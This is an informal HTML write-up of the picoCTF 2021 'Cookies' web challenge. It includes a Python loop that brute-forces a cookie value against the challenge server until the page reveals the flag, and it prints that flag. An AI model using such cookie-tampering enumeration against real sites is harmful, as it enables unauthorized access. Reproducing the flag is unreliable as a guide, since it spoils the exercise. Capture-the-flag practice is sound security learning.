
<!DOCTYPE html>
<html>
<head>
    <title>
      
    </title>
</head>
<body>
    <h1>picoctf2021- Cookies</h1>

    <h2>Challenge Description</h2>
    <p> Cookies
 | 40 points
Tags: 
AUTHOR: MADSTACKS

Description
Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:27177/
</p>

    <h2>Solution Approach</h2>
    <p>Here are the steps we took to solve the challenge:</p>
    <ol>
        <li> you caan manully change value of cookie of pagae in developer tools and application tab and cookie like image  </li>
        <img src=" https://phantom1ss.github.io/blog/2024/practice/picoctf/cookies/cookie1.png" alt="cookie location in google chrome" class="inline"/>
         <li>but i see that unitll value 5 get same result so use pytho code and while for set cookie in loop numbers</li>
<pre>
import requests
i=1
while True:
 url = "http://mercury.picoctf.net:27177/check"
 cookie_name = "name"
 cookie_value =str(i) # Set the desired cookie value
 i+=1
 # Set the cookie in the headers
 headers = {
    'Cookie': f'{cookie_name}={cookie_value}'
 }

 # Make the request with the specified headers
 response = requests.get(url, headers=headers)

 # Print the content of the response
 s=response.content.decode('utf-8')
 if "pico" in s:
  print(s,i)
  break

￼
</pre>
    </ol>
<li>in value 29(is random in different time) can get result page have pico or  flag</li>
<br>
    <h2>Flag</h2>
    <p class="flag">picoCTF{3v3ry1_l0v3s_c00k135_064663be}
</p>

    <h2>Conclusion</h2>
    <p>this is a very   easy chanllenge for work with cookies and web exploitation</p>
</body>
</html>
